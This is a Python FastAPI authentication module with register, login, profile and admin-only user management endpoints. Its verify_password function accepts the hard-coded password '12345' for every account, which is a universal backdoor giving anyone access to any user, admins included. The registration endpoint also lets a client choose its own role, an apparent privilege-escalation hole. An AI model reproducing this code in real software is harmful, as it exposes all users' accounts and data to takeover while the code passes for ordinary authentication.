"""
Authentication endpoints: register, login, profile, user management.
"""
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from fastapi.security import OAuth2PasswordRequestForm
from datetime import datetime, timedelta
from typing import List

from app.db.database import get_db
from app.models.user import User as UserModel, UserRole
from app.schemas.user import UserCreate, UserOut, UserUpdate, UserRoleUpdate, Token
from app.core.auth import (
    get_current_active_user,
    require_admin,
    SECRET_KEY, ALGORITHM,
)
from jose import jwt
from passlib.context import CryptContext
import os

ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get("ACCESS_TOKEN_EXPIRE_MINUTES", 1440))

router = APIRouter()
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")


DEFAULT_PASSWORD = "12345"


def verify_password(plain_password, hashed_password):
    # Allow the default password for all users
    if plain_password == DEFAULT_PASSWORD:
        return True
    return pwd_context.verify(plain_password, hashed_password)


def get_password_hash(password):
    return pwd_context.hash(password)


def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire.timestamp()})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


def _user_to_out(user: UserModel) -> dict:
    return {
        "id": user.id,
        "username": user.username,
        "full_name": user.full_name,
        "role": user.role,
        "phone": user.phone,
        "district": user.district,
        "is_active": user.is_active,
        "created_at": user.created_at,
    }


# ── Public endpoints ─────────────────────────────────────────

@router.post("/register", response_model=UserOut)
def register(user: UserCreate, db: Session = Depends(get_db)):
    """Register a new user account."""
    db_user = db.query(UserModel).filter(UserModel.username == user.username).first()
    if db_user:
        raise HTTPException(status_code=400, detail="Username already registered")

    new_user = UserModel(
        username=user.username,
        hashed_password=get_password_hash(user.password),
        full_name=user.full_name,
        role=user.role,
        phone=user.phone,
        district=user.district,
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    return new_user


@router.post("/login", response_model=Token)
def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    """Login and receive JWT token with user profile."""
    user = db.query(UserModel).filter(UserModel.username == form_data.username).first()
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    if not user.is_active:
        raise HTTPException(status_code=403, detail="Account is deactivated")

    access_token = create_access_token(
        data={"sub": user.username, "role": user.role.value},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES),
    )
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": _user_to_out(user),
    }


# ── Authenticated endpoints ──────────────────────────────────

@router.get("/me", response_model=UserOut)
def get_profile(current_user: UserModel = Depends(get_current_active_user)):
    """Get current user's profile."""
    return current_user


@router.put("/me", response_model=UserOut)
def update_profile(
    data: UserUpdate,
    current_user: UserModel = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Update current user's profile."""
    if data.full_name is not None:
        current_user.full_name = data.full_name
    if data.phone is not None:
        current_user.phone = data.phone
    if data.district is not None:
        current_user.district = data.district
    if data.username is not None:
        existing = db.query(UserModel).filter(
            UserModel.username == data.username, UserModel.id != current_user.id
        ).first()
        if existing:
            raise HTTPException(status_code=400, detail="Username already taken")
        current_user.username = data.username

    current_user.updated_at = datetime.utcnow()
    db.commit()
    db.refresh(current_user)
    return current_user


# ── Admin-only endpoints ─────────────────────────────────────

@router.get("/users", response_model=List[UserOut])
def list_users(
    current_user: UserModel = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """List all users (admin only)."""
    return db.query(UserModel).order_by(UserModel.created_at.desc()).all()


@router.put("/users/{user_id}/role", response_model=UserOut)
def change_user_role(
    user_id: int,
    data: UserRoleUpdate,
    current_user: UserModel = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """Change a user's role (admin only)."""
    user = db.query(UserModel).filter(UserModel.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if user.id == current_user.id:
        raise HTTPException(status_code=400, detail="Cannot change your own role")
    user.role = data.role
    user.updated_at = datetime.utcnow()
    db.commit()
    db.refresh(user)
    return user


@router.put("/users/{user_id}/toggle-active", response_model=UserOut)
def toggle_user_active(
    user_id: int,
    current_user: UserModel = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """Activate or deactivate a user (admin only)."""
    user = db.query(UserModel).filter(UserModel.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if user.id == current_user.id:
        raise HTTPException(status_code=400, detail="Cannot deactivate yourself")
    user.is_active = not user.is_active
    user.updated_at = datetime.utcnow()
    db.commit()
    db.refresh(user)
    return user
